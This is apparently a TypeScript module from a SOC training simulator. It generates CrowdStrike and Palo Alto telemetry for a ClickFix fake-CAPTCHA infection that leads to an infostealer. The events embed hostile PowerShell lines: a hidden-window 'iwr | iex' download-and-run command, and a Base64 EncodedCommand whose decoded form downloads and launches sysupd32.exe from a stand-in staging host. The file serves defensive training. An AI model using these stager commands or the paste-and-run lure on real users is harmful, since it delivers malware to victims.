/**
 * Events-only half of the ./clickFixFakeCaptcha.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./clickFixFakeCaptcha.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";
import { csFile, csProcess, csDetection, csRegistry, csDns, csNetwork } from "@/lib/sim/emitters/crowdstrike";
import { panWeb } from "@/lib/sim/emitters/paloalto";
import { scriptScan as scriptScanRecord } from "./corroboratingTelemetry.events";

/** Telemetry half of `buildClickFixFakeCaptchaScenario`: the events and the story title, no answer key. */
export function clickFixFakeCaptchaScenarioEvents() {
  const B = new Date("2026-07-21T14:10:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "WS-3387", ip: "10.14.19.56" };
  const victim = { email: "t.avraham@nexacorp.com", name: "Tomer Avraham", sam: "t.avraham" };
  // Shared emitter context, one NexaCorp workstation, CrowdStrike + Palo Alto.
  const cs = { companyId: "nexacorp", host: host.hostname, user: victim.email, srcIp: host.ip };

  // Attacker-run lure page, built specifically to host the fake CAPTCHA,
  // not a hijacked trusted resource. A different teaching point from other
  // drive-by scenarios: nothing here relies on a well-known site being
  // compromised.
  const lurePage = "invoice-templates-pro.com";
  const widgetHost = "human-verify-check.net";
  const stagingHost = "pkg-delivery-cdn.net";
  const c2 = "sync-metrics-relay.com";

  // The first-stage script is never written to disk, it runs entirely in
  // memory via `iwr | iex`. There is deliberately no hash for it here; that
  // absence is itself the point of question 3 below.
  const stealerHash = makeSha256("commodity_infostealer_binary_paste_run_2026");
  const powershellHash = makeSha256("windows_powershell_v1_signed_microsoft");
  const explorerHash = makeSha256("windows_explorer_exe_signed_microsoft");

  // EDR↔scenario integration (Phase 4): one incident, endpoint-primary →
  // edr_scope "edr". Alert-grade rows: the Falcon paste-and-run detection that
  // opens the ticket, plus the paste-and-run behavioural event (the crux). The
  // rest is pivot-only telemetry walked in the process tree.
  const INCIDENT = "inc:cfc:1";

  const PS_PATH = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
  const STEALER_PATH = "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe";
  const encCmd = "KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBwAGsAZwAtAGQAZQBsAGkAdgBlAHIAeQAtAGMAZABuAC4AbgBlAHQALwB2AC8AcwB5AHMAdQBwAGQAMwAyAC4AZQB4AGUAJwAsACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAiACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AHMAdQBwAGQAMwAyAC4AZQB4AGUAIgA=";
  const decodedChild = "(New-Object Net.WebClient).DownloadFile('https://pkg-delivery-cdn.net/v/sysupd32.exe',\"$env:TEMP\\sysupd32.exe\"); Start-Process \"$env:TEMP\\sysupd32.exe\"";
  const stagerScript = `& powershell.exe -EncodedCommand ${encCmd}`;
  const sensorId = makeSha256(`sensor:${host.hostname}`).slice(0, 32);
  // Falcon ScriptControlScanTelemetry: the script text the PowerShell engine was asked to run, in memory
  // (the fileless stages leave no file, so this is where their content is visible).
  const scriptScan = (id: string, ms: number, content: string, cmdline: string, parentPath: string, description: string): TelemetryEvent =>
    scriptScanRecord({
      id, ts: T(ms), incidentId: INCIDENT, host: host.hostname, user: victim.sam, userEmail: victim.email, srcIp: host.ip, sensorId,
      userDomainName: "NEXACORP\\t.avraham", content, cmdline, parentPath,
      hostProcessPath: "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", description,
    });

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1-9. The ClickFix paste-and-run chain - CrowdStrike + Palo Alto, generated
    //      by the typed emitters. Host, user (NEXACORP\t.avraham), PIDs and hashes
    //      thread consistently; every raw block uses only registry-valid fields.
    // ---------------------------------------------------------------------

    // 1. The user lands on the attacker-run lure page.
    panWeb({
      ...cs, id: "evt_cfc_01_lure_page", ts: T(0), severity: "low",
      url: `https://${lurePage}/templates/free-download`, domain: lurePage,
      category: "computer-and-internet-info", action: "alert", dstIp: "146.190.62.4", status: 200, bytesIn: 61_204,
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0 Safari/537.36",
      userTitle: "Sales Development Representative",
      description: "WS-3387 loaded a 'free invoice template' page on invoice-templates-pro.com at 14:10, allowed under the category computer-and-internet-info.",
    }),

    // 2. The fake-CAPTCHA widget loads (it copies the command to the clipboard).
    panWeb({
      ...cs, id: "evt_cfc_02_widget_fetch", ts: T(45_000), severity: "low",
      url: `https://${widgetHost}/widget/captcha.js`, domain: widgetHost,
      category: "computer-and-internet-info", action: "alert", dstIp: "185.207.14.92", status: 200, bytesIn: 9_872,
      referer: `https://${lurePage}/templates/free-download`,
      description: "Forty-five seconds later the page loaded /widget/captcha.js from human-verify-check.net, referred by the invoice-templates-pro.com page.",
    }),

    // 2b. The tell the "CAPTCHA" instructed Win+R → Ctrl+V → Enter: the pasted command
    //     is written to the Run-dialog MRU list (HKCU\...\Explorer\RunMRU) by explorer.
    csRegistry({
      ...cs, id: "evt_cfc_02b_runmru", ts: T(2 * MIN + 49_900),
      keyPath: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU",
      valueName: "a",
      valueData: "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"\\1",
      writerProcess: "explorer.exe",
      mitre: "T1204.004", tactic: "Execution", severity: "medium",
      description: "A RunMRU value was written under HKCU\\...\\Explorer\\RunMRU holding the PowerShell command line, the record of a command typed or pasted into the Windows Run dialog.",
    }),

    // 3. THE CRUX, explorer directly spawns PowerShell (a pasted Run-dialog command,
    //    no antecedent download).
    csProcess({
      ...cs, id: "evt_cfc_03_paste_run", ts: T(2 * MIN + 50_000),
      processName: "powershell.exe", pid: 8840, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"",
      parentName: "explorer.exe", parentPid: 3912, sha256: powershellHash, signed: true,
      mitre: "T1204.004", tactic: "Execution", severity: "high", isDetection: true,
      description: "At 14:12:50 explorer.exe started powershell.exe with a hidden-window download-and-run command line. No file was downloaded or written beforehand, the process was launched directly, consistent with a pasted command run from the Windows Run dialog.",
    }),

    // 3b. The first PowerShell resolves and contacts the staging host; its script content is scanned in memory.
    csDns({
      ...cs, id: "evt_cfc_03b_dns_stager", ts: T(2 * MIN + 52_000), severity: "medium",
      domain: stagingHost, resolvedIp: "91.223.104.17",
      processName: "powershell.exe", pid: 8840, processPath: PS_PATH, parentName: "explorer.exe", parentPid: 3912,
      description: "powershell.exe (pid 8840) on WS-3387 resolved pkg-delivery-cdn.net.",
    }),
    csNetwork({
      ...cs, id: "evt_cfc_03c_connect_stager", ts: T(2 * MIN + 52_500), severity: "medium",
      remoteIp: "91.223.104.17", remotePort: 443, application: "tls", domain: stagingHost,
      processName: "powershell.exe", pid: 8840, processPath: PS_PATH, parentName: "explorer.exe", parentPid: 3912,
      description: "powershell.exe (pid 8840) on WS-3387 connected to 91.223.104.17:443.",
    }),
    scriptScan("evt_cfc_03d_script_stager", 2 * MIN + 55_000, stagerScript,
      "powershell.exe -w hidden -c \"iwr -useb https://pkg-delivery-cdn.net/v/init.ps1 | iex\"", "C:\\Windows\\explorer.exe",
      "Falcon scanned the script text the first PowerShell executed in memory: it launches a second PowerShell with an encoded command."),

    // 4. The fileless stager pulls its content directly into memory.
    panWeb({
      ...cs, id: "evt_cfc_04_stager_fetch", ts: T(2 * MIN + 53_000), severity: "medium",
      url: `https://${stagingHost}/v/init.ps1`, domain: stagingHost, category: "unknown",
      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 8_192, mitre: "T1105", tactic: "Command and Control",
      description: "Three seconds later the same host requested /v/init.ps1 from pkg-delivery-cdn.net, matching the URL in the PowerShell command line.",
    }),

    // 5. The stager spawns a child PowerShell with a Base64-encoded command.
    csProcess({
      ...cs, id: "evt_cfc_05_encoded_child", ts: T(2 * MIN + 58_000),
      processName: "powershell.exe", pid: 8901, processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      cmdline: "powershell.exe -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAcwA6AC8ALwBwAGsAZwAtAGQAZQBsAGkAdgBlAHIAeQAtAGMAZABuAC4AbgBlAHQALwB2AC8AcwB5AHMAdQBwAGQAMwAyAC4AZQB4AGUAJwAsACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHkAcwB1AHAAZAAzADIALgBlAHgAZQAiACkAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAcwB5AHMAdQBwAGQAMwAyAC4AZQB4AGUAIgA=",
      parentName: "powershell.exe", parentPid: 8840, sha256: powershellHash, signed: true,
      mitre: "T1059.001", tactic: "Execution", severity: "critical",
      description: "Five seconds later the same PowerShell process spawned a child PowerShell process with a Base64-encoded command line.",
    }),

    scriptScan("evt_cfc_05a_script_child", 3 * MIN + 1_000, decodedChild,
      "powershell.exe -EncodedCommand " + encCmd, PS_PATH,
      "Falcon scanned the decoded script the second PowerShell executed: it downloads sysupd32.exe into the Temp folder and starts it."),
    csDns({
      ...cs, id: "evt_cfc_05c_dns_stealer", ts: T(3 * MIN + 1_000), severity: "medium",
      domain: stagingHost, resolvedIp: "91.223.104.17",
      processName: "powershell.exe", pid: 8901, processPath: PS_PATH, parentName: "powershell.exe", parentPid: 8840,
      description: "powershell.exe (pid 8901) on WS-3387 resolved pkg-delivery-cdn.net.",
    }),
    csNetwork({
      ...cs, id: "evt_cfc_05d_connect_stealer", ts: T(3 * MIN + 1_500), severity: "medium",
      remoteIp: "91.223.104.17", remotePort: 443, application: "tls", domain: stagingHost,
      processName: "powershell.exe", pid: 8901, processPath: PS_PATH, parentName: "powershell.exe", parentPid: 8840,
      description: "powershell.exe (pid 8901) on WS-3387 connected to 91.223.104.17:443.",
    }),

    // 5b. The encoded command's download of the second stage, as the firewall saw it.
    panWeb({
      ...cs, id: "evt_cfc_05b_stealer_fetch", ts: T(3 * MIN + 2_000), severity: "high",
      url: `https://${stagingHost}/v/sysupd32.exe`, domain: stagingHost, category: "unknown",
      action: "alert", dstIp: "91.223.104.17", status: 200, bytesIn: 892_416,
      file: { name: "sysupd32.exe", path: "/v/sysupd32.exe", sha256: stealerHash, size: 892_416 },
      fileType: "pe", mitre: "T1105", tactic: "Command and Control",
      description: "The child PowerShell then fetched /v/sysupd32.exe from pkg-delivery-cdn.net, the file named in its decoded Base64 command line.",
    }),

    // 6. The encoded command decodes to a download, the file finally appears on disk.
    csFile({
      ...cs, id: "evt_cfc_06_stealer_written", ts: T(3 * MIN + 5_000),
      path: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe", sha256: stealerHash, size: 892_416, signed: false, severity: "medium",
      actorProcess: "powershell.exe", actorPid: 8901, actorPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", actorSha256: powershellHash,
      description: "powershell.exe (pid 8901) wrote C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe, unsigned, 871 KB.",
    }),

    // 7. The dropped binary runs.
    csProcess({
      ...cs, id: "evt_cfc_07_stealer_execute", ts: T(3 * MIN + 9_000),
      processName: "sysupd32.exe", pid: 9014, processPath: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
      cmdline: "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
      parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash, signed: false, severity: "high",
      description: "Four seconds later powershell.exe (PID 8901) launched sysupd32.exe from the Temp folder.",
    }),

    csDns({
      ...cs, id: "evt_cfc_07b_dns_c2", ts: T(3 * MIN + 11_000), severity: "high",
      domain: c2, resolvedIp: "185.212.171.30",
      processName: "sysupd32.exe", pid: 9014, processPath: STEALER_PATH, parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash,
      description: "sysupd32.exe (pid 9014) on WS-3387 resolved sync-metrics-relay.com.",
    }),
    csNetwork({
      ...cs, id: "evt_cfc_07c_connect_c2", ts: T(3 * MIN + 11_500), severity: "high",
      remoteIp: "185.212.171.30", remotePort: 443, application: "tls", domain: c2,
      processName: "sysupd32.exe", pid: 9014, processPath: STEALER_PATH, parentName: "powershell.exe", parentPid: 8901, sha256: stealerHash,
      description: "sysupd32.exe (pid 9014) on WS-3387 connected to 185.212.171.30:443.",
    }),

    // 8. Its outbound call is refused at the perimeter (block-url).
    panWeb({
      ...cs, id: "evt_cfc_08_c2_blocked", ts: T(3 * MIN + 12_000), severity: "high",
      url: `https://${c2}/s/2`, domain: c2, category: "newly-registered-domain", action: "block",
      dstIp: "185.212.171.30", status: 0, mitre: "T1071.001", tactic: "Command and Control",
      description: "sysupd32.exe's outbound request to sync-metrics-relay.com was denied under the category newly-registered-domain.",
    }),

    // 9. The Falcon detection that opens the ticket (killed sysupd32.exe).
    {
      ...csDetection({
        ...cs, id: "evt_cfc_09_edr_alert", ts: T(3 * MIN + 30_000), eventType: "edr_alert",
        processName: "sysupd32.exe", pid: 9014, parentPid: 8901,
        processPath: "C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe",
        cmdline: "\"C:\\Users\\t.avraham\\AppData\\Local\\Temp\\sysupd32.exe\"",
        sha256: stealerHash, threatName: "ClickFixPasteAndRunChain",
        action: "killed", expectedVerdict: "tp", mitre: "T1204.004", tactic: "Execution",
        technique: "User Execution: Malicious Copy and Paste", severity: "critical",
        description: "Falcon raised a Critical detection on WS-3387 for a paste-and-run chain, explorer.exe directly spawning PowerShell, no antecedent download, and killed sysupd32.exe.",
      }),
      edr_scope: "edr",
    },
  ];

  // Story order: the log is read oldest-first.
  events.sort((a, b) => a.ts.localeCompare(b.ts));

  // Every event belongs to the one incident.
  for (const e of events) e.incident_id = INCIDENT;
  // explorer.exe is the real writer of RunMRU (Win+R). It has no process-create row of its
  // own, so give the registry event an explicit writer identity (image, pid, hash) that the
  // native card can name, otherwise the DeviceRegistryEvents record has no initiating process.
  const runmru = events.find(e => e.id === "evt_cfc_02b_runmru");
  if (runmru) {
    runmru.process = {
      name: "explorer.exe", pid: 3912, path: "C:\\Windows\\explorer.exe",
      hash: { sha256: explorerHash },
    };
  }

  return { title: "Blocked outbound connection on a browsing workstation", events, T, MIN, host, lurePage, widgetHost, stagingHost, c2, stealerHash };
}
